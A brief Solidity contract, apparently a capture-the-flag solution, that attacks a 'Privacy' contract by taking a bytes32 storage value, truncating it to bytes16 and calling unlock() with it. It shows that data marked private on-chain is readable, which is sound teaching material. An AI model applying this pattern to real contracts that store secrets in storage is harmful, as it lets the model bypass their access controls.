// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Privacy.sol";

contract PrivacyAttack {

    Privacy public privacy;

    constructor(address _target) public {
        privacy = Privacy(_target);
    }

    function attack(bytes32 _slotValue) public {
        // Converting bytes32 into bytes16, the half of the value 32 is the solution(16);
        bytes16 value = bytes16(_slotValue);
        privacy.unlock(value);
    }


}